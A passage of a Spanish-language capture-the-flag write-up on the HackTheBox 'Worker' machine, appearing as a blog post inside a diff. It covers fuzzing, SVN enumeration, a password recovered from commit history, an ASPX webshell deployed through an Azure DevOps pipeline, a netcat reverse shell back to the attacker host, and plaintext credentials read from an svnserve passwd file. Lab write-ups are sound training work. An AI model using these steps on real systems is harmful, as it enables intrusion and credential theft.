-</p>
-
-<ul>
-  <li>Vamos a hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos alguna ruta interesante.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.203 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
-<span class="o">===============================================================</span>
-Gobuster v3.6
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+] Url:                     http://10.10.10.203
-<span class="o">[</span>+] Method:                  GET
-<span class="o">[</span>+] Threads:                 80
-<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-<span class="o">[</span>+] Negative Status codes:   404
-<span class="o">[</span>+] User Agent:              gobuster/3.6
-<span class="o">[</span>+] Timeout:                 10s
-<span class="o">===============================================================</span>
-Starting gobuster <span class="k">in </span>directory enumeration mode
-<span class="o">===============================================================</span>
-/<span class="k">*</span>checkout<span class="k">*</span>           <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/<span class="k">*</span>docroot<span class="k">*</span>            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/<span class="k">*</span>                    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/http%3A%2F%2Fwww     <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/http%3A              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/q%26a                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/<span class="k">**</span>http%3a            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/<span class="k">*</span>http%3A             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/<span class="k">**</span>http%3A            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/http%3A%2F%2Fyoutube <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/http%3A%2F%2Fblogs   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/http%3A%2F%2Fblog    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/<span class="k">**</span>http%3A%2F%2Fwww   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/s%26p                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/%3FRID%3D2671        <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/devinmoore<span class="k">*</span>          <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/200109<span class="k">*</span>              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/<span class="k">*</span>dc_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-/<span class="k">*</span>sa_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Bueno tenemos otro puerto abierto el cual es el 3690 que corre el servicio de <code class="language-plaintext highlighter-rouge">svnserve</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server">https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server</a>.</p>
-  </li>
-  <li>
-    <p><a href="https://www.visualsvn.com/server/">https://www.visualsvn.com/server/</a>.</p>
-  </li>
-  <li>
-    <p>En <code class="language-plaintext highlighter-rouge">hacktricks</code> nos dicen como podemos enumerar este servicio.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nc <span class="nt">-vn</span> 10.10.10.203 3690
-<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 3690 <span class="o">(</span>svn<span class="o">)</span> open
-<span class="o">(</span> success <span class="o">(</span> 2 2 <span class="o">(</span> <span class="o">)</span> <span class="o">(</span> edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list <span class="o">)</span> <span class="o">)</span> <span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Además nos mencionan uso de esta herramienta.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn <span class="nb">help
-</span>usage: svn &lt;subcommand&gt; <span class="o">[</span>options] <span class="o">[</span>args]
-Subversion command-line client.
-Type <span class="s1">'svn help &lt;subcommand&gt;'</span> <span class="k">for </span><span class="nb">help </span>on a specific subcommand.
-Type <span class="s1">'svn --version'</span> to see the program version and RA modules,
-     <span class="s1">'svn --version --verbose'</span> to see dependency versions as well,
-     <span class="s1">'svn --version --quiet'</span> to see just the version number.
-
-Most subcommands take file and/or directory arguments, recursing
-on the directories.  If no arguments are supplied to such a
-<span class="nb">command</span>, it recurses on the current directory <span class="o">(</span>inclusive<span class="o">)</span> by default.
-
-Available subcommands:
-   add
-   auth
-   blame <span class="o">(</span>praise, annotate, ann<span class="o">)</span>
-   <span class="nb">cat
-   </span>changelist <span class="o">(</span>cl<span class="o">)</span>
-   checkout <span class="o">(</span>co<span class="o">)</span>
-   cleanup
-   commit <span class="o">(</span>ci<span class="o">)</span>
-   copy <span class="o">(</span><span class="nb">cp</span><span class="o">)</span>
-   delete <span class="o">(</span>del, remove, <span class="nb">rm</span><span class="o">)</span>
-   diff <span class="o">(</span>di<span class="o">)</span>
-   <span class="nb">export
-   help</span> <span class="o">(</span>?, h<span class="o">)</span>
-   import
-   info
-   list <span class="o">(</span><span class="nb">ls</span><span class="o">)</span>
-   lock
-   log
-   merge
-   mergeinfo
-   <span class="nb">mkdir
-   </span>move <span class="o">(</span><span class="nb">mv</span>, rename, ren<span class="o">)</span>
-   patch
-   propdel <span class="o">(</span>pdel, pd<span class="o">)</span>
-   propedit <span class="o">(</span>pedit, pe<span class="o">)</span>
-   propget <span class="o">(</span>pget, pg<span class="o">)</span>
-   proplist <span class="o">(</span>plist, pl<span class="o">)</span>
-   propset <span class="o">(</span>pset, ps<span class="o">)</span>
-   relocate
-   resolve
-   resolved
-   revert
-   status <span class="o">(</span><span class="nb">stat</span>, st<span class="o">)</span>
-   switch <span class="o">(</span>sw<span class="o">)</span>
-   unlock
-   update <span class="o">(</span>up<span class="o">)</span>
-   upgrade
-
-Subversion is a tool <span class="k">for </span>version control.
-For additional information, see http://subversion.apache.org/
-</code></pre></div></div>
-
-<ul>
-  <li>Podemos listar lo que hay.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn <span class="nb">ls </span>svn://10.10.10.203
-dimension.worker.htb/
-moved.txt
-</code></pre></div></div>
-
-<ul>
-  <li>Tambien nos dicen que podemos descargar el repositorio.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn checkout svn://10.10.10.203
-A    dimension.worker.htb
-A    dimension.worker.htb/LICENSE.txt
-A    dimension.worker.htb/README.txt
-A    dimension.worker.htb/assets
-A    dimension.worker.htb/assets/css
-A    dimension.worker.htb/assets/css/fontawesome-all.min.css
-A    dimension.worker.htb/assets/css/main.css
-A    dimension.worker.htb/assets/css/noscript.css
-A    dimension.worker.htb/assets/js
-A    dimension.worker.htb/assets/js/breakpoints.min.js
-A    dimension.worker.htb/assets/js/browser.min.js
-A    dimension.worker.htb/assets/js/jquery.min.js
-A    dimension.worker.htb/assets/js/main.js
-A    dimension.worker.htb/assets/js/util.js
-A    dimension.worker.htb/assets/sass
-A    dimension.worker.htb/assets/sass/base
-A    dimension.worker.htb/assets/sass/base/_page.scss
-A    dimension.worker.htb/assets/sass/base/_reset.scss
-A    dimension.worker.htb/assets/sass/base/_typography.scss
-A    dimension.worker.htb/assets/sass/components
-A    dimension.worker.htb/assets/sass/components/_actions.scss
-A    dimension.worker.htb/assets/sass/components/_box.scss
-A    dimension.worker.htb/assets/sass/components/_button.scss
-A    dimension.worker.htb/assets/sass/components/_form.scss
-A    dimension.worker.htb/assets/sass/components/_icon.scss
-A    dimension.worker.htb/assets/sass/components/_icons.scss
-A    dimension.worker.htb/assets/sass/components/_image.scss
-A    dimension.worker.htb/assets/sass/components/_list.scss
-A    dimension.worker.htb/assets/sass/components/_table.scss
-A    dimension.worker.htb/assets/sass/layout
-A    dimension.worker.htb/assets/sass/layout/_bg.scss
-A    dimension.worker.htb/assets/sass/layout/_footer.scss
-A    dimension.worker.htb/assets/sass/layout/_header.scss
-A    dimension.worker.htb/assets/sass/layout/_main.scss
-A    dimension.worker.htb/assets/sass/layout/_wrapper.scss
-A    dimension.worker.htb/assets/sass/libs
-A    dimension.worker.htb/assets/sass/libs/_breakpoints.scss
-A    dimension.worker.htb/assets/sass/libs/_functions.scss
-A    dimension.worker.htb/assets/sass/libs/_mixins.scss
-A    dimension.worker.htb/assets/sass/libs/_vars.scss
-A    dimension.worker.htb/assets/sass/libs/_vendor.scss
-A    dimension.worker.htb/assets/sass/main.scss
-A    dimension.worker.htb/assets/sass/noscript.scss
-A    dimension.worker.htb/assets/webfonts
-A    dimension.worker.htb/assets/webfonts/fa-brands-400.eot
-A    dimension.worker.htb/assets/webfonts/fa-brands-400.svg
-A    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
-A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff
-A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
-A    dimension.worker.htb/assets/webfonts/fa-regular-400.eot
-A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg
-A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
-A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff
-A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
-A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot
-A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg
-A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
-A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff
-A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
-A    dimension.worker.htb/images
-A    dimension.worker.htb/images/bg.jpg
-A    dimension.worker.htb/images/overlay.png
-A    dimension.worker.htb/images/pic01.jpg
-A    dimension.worker.htb/images/pic02.jpg
-A    dimension.worker.htb/images/pic03.jpg
-A    dimension.worker.htb/index.html
-A    moved.txt
-Checked out revision 5.
-</code></pre></div></div>
-
-<ul>
-  <li>Si vemos lo que dice <code class="language-plaintext highlighter-rouge">moved.txt</code> nos dan un subdominio nos hablan sobre una versión final.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>moved.txt
-This repository has been migrated and will no longer be maintaned here.
-You can find the latest version at: http://devops.worker.htb
-
-// The Worker team :<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos agregarlos al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que en caso de que sea alguna pagina web nos pueda resolver.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.10.203 devops.worker.htb dimension.worker.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
-</code></pre></div></div>
-
-<ul>
-  <li>Nos pide credenciales.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/2.png" />
-</p>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/3.png" />
-</p>
-
-<ul>
-  <li>En el otro subdominio solo encontramos esto.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/4.png" />
-</p>
-
-<ul>
-  <li>Esto es todo lo que contiene.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb tree
-<span class="nb">.</span>
-├── LICENSE.txt
-├── README.txt
-├── assets
-│   ├── css
-│   │   ├── fontawesome-all.min.css
-│   │   ├── main.css
-│   │   └── noscript.css
-│   ├── js
-│   │   ├── breakpoints.min.js
-│   │   ├── browser.min.js
-│   │   ├── jquery.min.js
-│   │   ├── main.js
-│   │   └── util.js
-│   ├── sass
-│   │   ├── base
-│   │   │   ├── _page.scss
-│   │   │   ├── _reset.scss
-│   │   │   └── _typography.scss
-│   │   ├── components
-│   │   │   ├── _actions.scss
-│   │   │   ├── _box.scss
-│   │   │   ├── _button.scss
-│   │   │   ├── _form.scss
-│   │   │   ├── _icon.scss
-│   │   │   ├── _icons.scss
-│   │   │   ├── _image.scss
-│   │   │   ├── _list.scss
-│   │   │   └── _table.scss
-│   │   ├── layout
-│   │   │   ├── _bg.scss
-│   │   │   ├── _footer.scss
-│   │   │   ├── _header.scss
-│   │   │   ├── _main.scss
-│   │   │   └── _wrapper.scss
-│   │   ├── libs
-│   │   │   ├── _breakpoints.scss
-│   │   │   ├── _functions.scss
-│   │   │   ├── _mixins.scss
-│   │   │   ├── _vars.scss
-│   │   │   └── _vendor.scss
-│   │   ├── main.scss
-│   │   └── noscript.scss
-│   └── webfonts
-│       ├── fa-brands-400.eot
-│       ├── fa-brands-400.svg
-│       ├── fa-brands-400.ttf
-│       ├── fa-brands-400.woff
-│       ├── fa-brands-400.woff2
-│       ├── fa-regular-400.eot
-│       ├── fa-regular-400.svg
-│       ├── fa-regular-400.ttf
-│       ├── fa-regular-400.woff
-│       ├── fa-regular-400.woff2
-│       ├── fa-solid-900.eot
-│       ├── fa-solid-900.svg
-│       ├── fa-solid-900.ttf
-│       ├── fa-solid-900.woff
-│       └── fa-solid-900.woff2
-├── images
-│   ├── bg.jpg
-│   ├── overlay.png
-│   ├── pic01.jpg
-│   ├── pic02.jpg
-│   └── pic03.jpg
-└── index.html
-
-11 directories, 55 files
-</code></pre></div></div>
-
-<ul>
-  <li>Aquí podemos ver el <code class="language-plaintext highlighter-rouge">Commit history</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log svn://10.10.10.203
-<span class="nt">------------------------------------------------------------------------</span>
-r5 | nathen | 2020-06-20 08:52:00 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
-
-Added note that repo has been migrated
-<span class="nt">------------------------------------------------------------------------</span>
-r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
-
-Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
-<span class="nt">------------------------------------------------------------------------</span>
-r3 | nathen | 2020-06-20 08:46:19 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
-
--
-<span class="nt">------------------------------------------------------------------------</span>
-r2 | nathen | 2020-06-20 08:45:16 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
-
-Added deployment script
-<span class="nt">------------------------------------------------------------------------</span>
-r1 | nathen | 2020-06-20 08:43:43 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
-
-First version
-<span class="nt">------------------------------------------------------------------------</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Este es interesante.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log <span class="nt">-r</span> 4 svn://10.10.10.203
-<span class="nt">------------------------------------------------------------------------</span>
-r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
-
-Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
-<span class="nt">------------------------------------------------------------------------</span>
-</code></pre></div></div>
-
-<ul>
-  <li>El archivo <code class="language-plaintext highlighter-rouge">deploy.ps1</code> fue eliminado.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log <span class="nt">-v</span> <span class="nt">-r</span> 4 svn://10.10.10.203
-<span class="nt">------------------------------------------------------------------------</span>
-r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
-Changed paths:
-   D /deploy.ps1
-
-Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
-<span class="nt">------------------------------------------------------------------------</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Si revisamos cambios que se realizaron en ese archivo antes de ser eliminado vemos credenciales.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn diff <span class="nt">-r</span> 2:3 svn://10.10.10.203/deploy.ps1
-
-Index: deploy.ps1
-<span class="o">===================================================================</span>
-<span class="nt">---</span> deploy.ps1	<span class="o">(</span>revision 2<span class="o">)</span>
-+++ deploy.ps1	<span class="o">(</span>revision 3<span class="o">)</span>
-@@ <span class="nt">-1</span>,6 +1,7 @@
- <span class="nv">$user</span> <span class="o">=</span> <span class="s2">"nathen"</span>
--<span class="nv">$plain</span> <span class="o">=</span> <span class="s2">"wendel98"</span>
-+# NOTE: We cant have my password here!!!
-+<span class="nv">$plain</span> <span class="o">=</span> <span class="s2">""</span>
- <span class="nv">$pwd</span> <span class="o">=</span> <span class="o">(</span><span class="nv">$plain</span> | ConvertTo-SecureString<span class="o">)</span>
- <span class="nv">$Credential</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="nv">$user</span>, <span class="nv">$pwd</span>
- <span class="nv">$args</span> <span class="o">=</span> <span class="s2">"Copy-Site.ps1"</span>
-<span class="nt">-Start-Process</span> powershell.exe <span class="nt">-Credential</span> <span class="nv">$Credential</span> <span class="nt">-ArgumentList</span> <span class="o">(</span><span class="s2">"-file </span><span class="nv">$args</span><span class="s2">"</span><span class="o">)</span>
-+Start-Process powershell.exe <span class="nt">-Credential</span> <span class="nv">$Credential</span> <span class="nt">-ArgumentList</span> <span class="o">(</span><span class="s2">"-file </span><span class="nv">$args</span><span class="s2">"</span><span class="o">)</span>
-<span class="se">\ </span>No newline at end of file
-</code></pre></div></div>
-
-<ul>
-  <li>Si las probamos en el sitio web vemos que son correctas.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/5.png" />
-</p>
-
-<h2 id="shell-as-defaultapppool">Shell as defaultapppool</h2>
-
-<ul>
-  <li>Vemos varios repositorios al parecer son los subdominios.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/6.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Como tenemos acceso podemos subir un <code class="language-plaintext highlighter-rouge">.aspx</code> para ganar acceso <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx">https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx</a>.</p>
-  </li>
-  <li>
-    <p>Si lo intentamos subir no nos deja.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/7.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Nos dicen que tenemos que hacer un <code class="language-plaintext highlighter-rouge">Pull Request</code>.</p>
-  </li>
-  <li>
-    <p>Vamos a crear una nueva rama.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/8.png" />
-</p>
-
-<ul>
-  <li>Si subimos el archivo vemos que ahora si se puede.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/9.png" />
-</p>
-
-<ul>
-  <li>Vamos a crear un <code class="language-plaintext highlighter-rouge">Pull Request</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/10.png" />
-</p>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/11.png" />
-</p>
-
-<ul>
-  <li>Ahora lo aprobamos.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/12.png" />
-</p>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/13.png" />
-</p>
-
-<ul>
-  <li>Pero no vemos nada.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/14.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Podemos aprovecharnos de los Pipeline <a href="https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline">https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline</a>.</p>
-  </li>
-  <li>
-    <p>Si le damos en Run vemos que podemos construir una.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/15.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Bueno nos da un error y esto es por que al parecer la otra rama fue eliminada yo creo entonces tenemos que hacerlo rápido lo que vamos hacer es crear todo otra vez y subir el <code class="language-plaintext highlighter-rouge">cmd.aspx</code> hacer los mismos pasos pero ahora con la nueva rama.</p>
-  </li>
-  <li>
-    <p>Y vemos que ya se puede.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/16.png" />
-</p>
-
-<ul>
-  <li>Bueno ahora solo falta agregar el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n1</span>
-10.10.10.203 devops.worker.htb dimension.worker.htb alpha.worker.htb
-</code></pre></div></div>
-
-<ul>
-  <li>Y listo.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/17.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Ahora vamos a ganar acceso.</p>
-  </li>
-  <li>
-    <p>Vamos a usar el <code class="language-plaintext highlighter-rouge">netcat</code>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
-➜  content python3 <span class="nt">-m</span> http.server 8080
-Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora simplemente hacemos una petición con <code class="language-plaintext highlighter-rouge">curl</code> para descargamos el nc.exe y ponerlo en esa ruta del sistema.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/18.png" />
-</p>
-
-<ul>
-  <li>Ahora ya nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd tuip 443
-</code></pre></div></div>
-
-<ul>
-  <li>Nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
-listening on <span class="o">[</span>any] 443 ...
-connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 50333
-Microsoft Windows <span class="o">[</span>Version 10.0.17763.1282]
-<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
-
-c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami
-<span class="nb">whoami
-</span>iis apppool<span class="se">\d</span>efaultapppool
-
-c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
-</code></pre></div></div>
-
-<h2 id="shell-as-robisl">Shell as robisl</h2>
-
-<ul>
-  <li>Aquí vemos unidades logicas.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;net share
-net share
-
-Share name   Resource                        Remark
-
-<span class="nt">-------------------------------------------------------------------------------</span>
-C<span class="nv">$ </span>          C:<span class="se">\ </span>                            Default share
-IPC<span class="nv">$ </span>                                        Remote IPC
-W<span class="nv">$ </span>          W:<span class="se">\ </span>                            Default share
-ADMIN<span class="nv">$ </span>      C:<span class="se">\W</span>indows                      Remote Admin
-The <span class="nb">command </span>completed successfully.
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;w:
-w:
-
-W:<span class="se">\&gt;</span><span class="nb">dir
-dir
- </span>Volume <span class="k">in </span>drive W is Work
- Volume Serial Number is E82A-AEA8
-
- Directory of W:<span class="se">\</span>
-
-2020-06-16  18:59    &lt;DIR&gt;          agents
-2020-03-28  15:57    &lt;DIR&gt;          AzureDevOpsData
-2020-04-03  11:31    &lt;DIR&gt;          sites
-2020-06-20  16:04    &lt;DIR&gt;          svnrepos
-               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
-               4 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free
-
-W:<span class="se">\&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos un <code class="language-plaintext highlighter-rouge">passwd</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\&gt;</span><span class="nb">cd </span>svnrepos
-<span class="nb">cd </span>svnrepos
-
-W:<span class="se">\s</span>vnrepos&gt;dir
-<span class="nb">dir
- </span>Volume <span class="k">in </span>drive W is Work
- Volume Serial Number is E82A-AEA8
-
- Directory of W:<span class="se">\s</span>vnrepos
-
-2020-06-20  16:04    &lt;DIR&gt;          <span class="nb">.</span>
-2020-06-20  16:04    &lt;DIR&gt;          ..
-2020-06-20  11:29    &lt;DIR&gt;          www
-               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
-               3 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free
-
-W:<span class="se">\s</span>vnrepos&gt;cd www
-<span class="nb">cd </span>www
-
-W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww&gt;dir
-<span class="nb">dir
- </span>Volume <span class="k">in </span>drive W is Work
- Volume Serial Number is E82A-AEA8
-
- Directory of W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww
-
-2020-06-20  11:29    &lt;DIR&gt;          <span class="nb">.</span>
-2020-06-20  11:29    &lt;DIR&gt;          ..
-2020-06-20  15:30    &lt;DIR&gt;          conf
-2020-06-20  15:52    &lt;DIR&gt;          db
-2020-06-20  11:29                 2 format
-2020-06-20  11:29    &lt;DIR&gt;          hooks
-2020-06-20  11:29    &lt;DIR&gt;          locks
-2020-06-20  11:29               251 README.txt
-               2 File<span class="o">(</span>s<span class="o">)</span>            253 bytes
-               6 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free
-
-W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww&gt;cd conf
-<span class="nb">cd </span>conf
-
-W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;dir
-<span class="nb">dir
- </span>Volume <span class="k">in </span>drive W is Work
- Volume Serial Number is E82A-AEA8
-
- Directory of W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf
-
-2020-06-20  15:30    &lt;DIR&gt;          <span class="nb">.</span>
-2020-06-20  15:30    &lt;DIR&gt;          ..
-2020-06-20  11:29             1112 authz
-2020-06-20  11:29               904 hooks-env.tmpl
-2020-06-20  15:27             1031 passwd
-2020-04-04  20:51             4454 svnserve.conf
-               4 File<span class="o">(</span>s<span class="o">)</span>          7501 bytes
-               2 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free
-
-W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos usuarios y contraseñas.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;type passwd
-<span class="nb">type </span>passwd
-<span class="c">### This file is an example password file for svnserve.</span>
-<span class="c">### Its format is similar to that of svnserve.conf. As shown in the</span>
-<span class="c">### example below it contains one section labelled [users].</span>
-<span class="c">### The name and password for each user follow, one account per line.</span>
-
-<span class="o">[</span><span class="nb">users</span><span class="o">]</span>
-nathen <span class="o">=</span> wendel98
-nichin <span class="o">=</span> fqerfqerf
